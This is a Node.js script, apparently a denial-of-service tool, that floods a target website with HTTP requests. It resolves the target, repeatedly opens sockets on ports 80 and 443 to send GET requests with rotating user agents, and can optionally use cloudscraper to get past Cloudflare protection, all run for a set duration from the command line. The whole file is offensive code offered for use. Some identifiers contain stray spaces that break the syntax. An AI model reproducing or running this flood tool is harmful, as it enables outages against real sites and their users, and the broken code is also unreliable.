const cloudscraper = require('cloudscraper');
const net = require('net');
const dns = require('dns');
const { URL } = require('url');

const userAgents = [
    // Populate with a list of user agents...
];

const ports = [80, 443]; // HTTP and HTTPS ports
const method = "GET";

function getRandomUser Agent() {
    return userAgents[Math.floor(Math.random() * userAgents.length)];
}

async function createSocket(remote, port) {
    return new Promise((resolve, reject) => {
        const socket = new net.Socket();
        socket.connect(port, remote, () => resolve(socket));
        socket.on('error', reject);
    });
}

async function resolveIP(hostname) {
    return new Promise((resolve, reject) => {
        dns.lookup(hostname, (err, address) => {
            if (err) reject(err);
            else resolve(address);
        });
    });
}

async function sendRequests(sock, max) {
    for (let i = 0; i < max; i++) {
        const userAgent = getRandomUser Agent();
        const packet = `${method} / HTTP/1.1\r\nHost: ${sock.remoteAddress}\r\nUser -Agent: ${userAgent}\r\nConnection: Close\r\n\r\n`;
        sock.write(packet);
    }
}

async function sendRequestWithCloudscraper(url, userAgent) {
    try {
        const response = await cloudscraper.get(url, {
            headers: {
                'User -Agent': userAgent,
                'Connection': 'keep-alive',
            },
            timeout: 5000 // Set a timeout for the request
        });
        console.log(`[SUCCESS] Request sent to ${url} - Status: ${response.statusCode}`);
    } catch (err) {
        if (err.response) {
            console.error(`[ERROR] Request failed - Status: ${err.response.statusCode}, Message: ${err.message}`);
        } else {
            console.error(`[ERROR] Request failed - Message: ${err.message}`);
        }
    }
}

async function attack(ip, max, time) {
    const endTime = time ? Date.now() + time * 1000 : undefined;

    while (!endTime || Date.now() < endTime) {
        let sock;
        for (const port of ports) {
            try {
                sock = await createSocket(ip, port);
                await sendRequests(sock, max);
                sock.destroy(); // Close the socket after sending
                break; // Exit the port loop if successful
            } catch (err) {
                console.error(`[CONNECT-ERROR] Unable to connect to ${ip}:${port} - ${err.message}`);
                if (sock) sock.destroy(); // Ensure socket is closed
            }
        }
    }
}

async function senderWithCloudscraper(max, url, time) {
    const endTime = time ? Date.now() + time * 1000 : undefined;

    while (!endTime || Date.now() < endTime) {
        const requests = []; // Array to hold promises
        for (let i = 0; i < max; i++) {
            const userAgent = getRandomUser Agent(); // Get a random user agent
            requests.push(sendRequestWithCloudscraper(url, userAgent)); // Push the promise to the array
        }
        await Promise.all(requests); // Send all requests concurrently
        await new Promise(resolve => setTimeout(resolve, 1000)); // Delay between batches of requests
    }
}

async function layer7(url, max, time, useCloudscraper) {
    console.log("Starting attack...");
    const { hostname } = new URL(url);
    let ip;

    try {
        ip = await resolveIP(hostname);
        console.log(`Target IP: ${ip}`);
    } catch (err) {
        console.error("DNS resolution failed:", err);
        return;
    }

    if (useCloudscraper) {
        await senderWithCloudscraper(max, url, time);
    } else {
        for (let i = 0; i < max; i++) {
            await attack(ip, max, time);
        }
    }

    console.log("Attack completed.");
}

const args = process.argv.slice(2);
if (args.length >= 3) {
    const [url, max, time, useCloudscraperArg] = args;
    const useCloudscraper = useCloudscraperArg && useCloudscraperArg.toLowerCase() === 'cf';
    layer7(url, parseInt(max), parseInt(time), useCloudscraper);
} else {
    console.log("Usage: node script.js [url] [threads] [time] [cf (optional)]");
}
